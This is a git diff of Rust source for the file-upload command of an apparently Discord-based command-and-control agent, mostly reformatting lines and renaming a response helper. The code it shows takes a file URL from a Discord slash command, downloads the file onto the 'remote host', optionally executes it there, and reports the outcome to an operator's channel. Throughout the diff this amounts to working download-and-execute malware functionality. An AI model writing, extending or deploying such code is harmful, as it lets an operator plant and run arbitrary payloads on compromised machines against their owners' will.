@@ -7,11 +7,7 @@ use serenity::{
 	builder::CreateApplicationCommand,
 	model::{
 		application::command::CommandOptionType,
-		prelude::interaction::application_command::{
-			ApplicationCommandInteraction,
-			CommandDataOption,
-			CommandDataOptionValue,
-		},
+		prelude::interaction::application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
 	},
 	prelude::Context,
 };
@@ -20,11 +16,7 @@ use tracing::{error, info as informational};
 
 use super::session::SHELL_TYPE;
 use crate::{
-	discord_utils::bot_functions::{
-		send_channel_message,
-		send_edit_response,
-		send_interaction_response,
-	},
+	discord_utils::bot_functions::{old_send_edit_response, send_channel_message, send_interaction_response},
 	errors::DiscordC2Error,
 	os::process_handler::ProcessHandler,
 	utils::agent::get_or_create_agent,
@@ -64,25 +56,17 @@ pub async fn run(options: &[CommandDataOption], ctx: &Context) -> Result<String,
 
 	let file_path = options
 		.get(0)
-		.ok_or(DiscordC2Error::InternalError(
-			"Expected option at index 0".to_string(),
-		))?
+		.ok_or(DiscordC2Error::InternalError("Expected option at index 0".to_string()))?
 		.resolved
 		.as_ref()
-		.ok_or(DiscordC2Error::InternalError(
-			"Expected file path in options".to_string(),
-		))?;
+		.ok_or(DiscordC2Error::InternalError("Expected file path in options".to_string()))?;
 
 	let attachment = options
 		.get(1)
-		.ok_or(DiscordC2Error::InternalError(
-			"Expected option at index 1".to_string(),
-		))?
+		.ok_or(DiscordC2Error::InternalError("Expected option at index 1".to_string()))?
 		.resolved
 		.as_ref()
-		.ok_or(DiscordC2Error::InternalError(
-			"Expected attachment in options".to_string(),
-		))?;
+		.ok_or(DiscordC2Error::InternalError("Expected attachment in options".to_string()))?;
 
 	let execute = options
 		.get(2)
@@ -94,14 +78,7 @@ pub async fn run(options: &[CommandDataOption], ctx: &Context) -> Result<String,
 
 		if let CommandDataOptionValue::Attachment(attachment) = attachment {
 			if let CommandDataOptionValue::Boolean(execute) = execute {
-				request_handler(
-					file_path,
-					attachment.url.to_owned(),
-					attachment.filename.to_owned(),
-					*execute,
-					ctx,
-				)
-				.await?;
+				request_handler(file_path, attachment.url.to_owned(), attachment.filename.to_owned(), *execute, ctx).await?;
 			}
 		}
 	}
@@ -113,9 +90,7 @@ async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
 	let shell_type = SHELL_TYPE.lock().await;
 	let process_handler = match shell_type.as_ref() {
 		Some(shell_type) => ProcessHandler::instance(shell_type).await,
-		None => Err(DiscordC2Error::InvalidInput(
-			"Shell type not found.".to_string(),
-		)),
+		None => Err(DiscordC2Error::InvalidInput("Shell type not found.".to_string())),
 	}?;
 
 	// Should return a DiscordC2Error::RegexError if not successful
@@ -135,20 +110,9 @@ async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
 	}
 }
 
-async fn request_handler(
-	path: PathBuf,
-	url: String,
-	filename: String,
-	execute: bool,
-	ctx: &Context,
-) -> Result<(), DiscordC2Error> {
-	let response = reqwest::get(url)
-		.await
-		.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;
-	let bytes = response
-		.bytes()
-		.await
-		.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;
+async fn request_handler(path: PathBuf, url: String, filename: String, execute: bool, ctx: &Context) -> Result<(), DiscordC2Error> {
+	let response = reqwest::get(url).await.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;
+	let bytes = response.bytes().await.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;
 
 	let ctx = ctx.clone();
 
@@ -156,11 +120,7 @@ async fn request_handler(
 		let agent = get_or_create_agent(&ctx).await;
 		let session_channel = agent.get_session_channel().unwrap();
 
-		async fn download_result(
-			path: &Path,
-			filename: String,
-			bytes: &[u8],
-		) -> Result<PathBuf, DiscordC2Error> {
+		async fn download_result(path: &Path, filename: String, bytes: &[u8]) -> Result<PathBuf, DiscordC2Error> {
 			let final_path = path.join(filename);
 			let mut file = File::create(path.join(&final_path)).await?;
 			file.write_all(bytes).await?;
@@ -171,13 +131,7 @@ async fn request_handler(
 		let final_path = match download_result(&path, filename, &bytes).await {
 			Ok(path) => {
 				informational!("File downloaded to the remote host successfully");
-				if let Err(why) = send_channel_message(
-					&ctx,
-					session_channel,
-					"File downloaded to the remote host successfully",
-				)
-				.await
-				{
+				if let Err(why) = send_channel_message(&ctx, session_channel, "File downloaded to the remote host successfully").await {
 					error!("Couldn't send success message to the channel: {}", why);
 				}
 				Some(path)
@@ -187,10 +141,7 @@ async fn request_handler(
 				if let Err(why) = send_channel_message(
 					&ctx,
 					session_channel,
-					format!(
-						"File was not downloaded to the remote host successfully: ```{}```",
-						e
-					),
+					format!("File was not downloaded to the remote host successfully: ```{}```", e),
 				)
 				.await
 				{
@@ -211,13 +162,7 @@ async fn request_handler(
 				{
 					Ok(_) => {
 						informational!("Executed file successfully");
-						if let Err(why) = send_channel_message(
-							&ctx,
-							session_channel,
-							"Executed the file successfully",
-						)
-						.await
-						{
+						if let Err(why) = send_channel_message(&ctx, session_channel, "Executed the file successfully").await {
 							error!("Couldn't send success message to the channel: {}", why);
 						}
 					},
@@ -226,10 +171,7 @@ async fn request_handler(
 						if let Err(why) = send_channel_message(
 							&ctx,
 							session_channel,
-							format!(
-								"File was not executed on the remote host successfully: ```{}```",
-								e
-							),
+							format!("File was not executed on the remote host successfully: ```{}```", e),
 						)
 						.await
 						{
@@ -244,19 +186,16 @@ async fn request_handler(
 	Ok(())
 }
 
-pub async fn upload_handler(
-	ctx: &Context,
-	command: &ApplicationCommandInteraction,
-) -> Result<(), DiscordC2Error> {
+pub async fn upload_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
 	let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
 	let result = run(&command.data.options, ctx).await;
 
 	match result {
 		Ok(why) => {
-			send_edit_response(ctx, &response, why).await?;
+			old_send_edit_response(ctx, &response, why).await?;
 		},
 		Err(why) => {
-			send_edit_response(ctx, &response, why.to_string()).await?;
+			old_send_edit_response(ctx, &response, why.to_string()).await?;
 		},
 	}
 
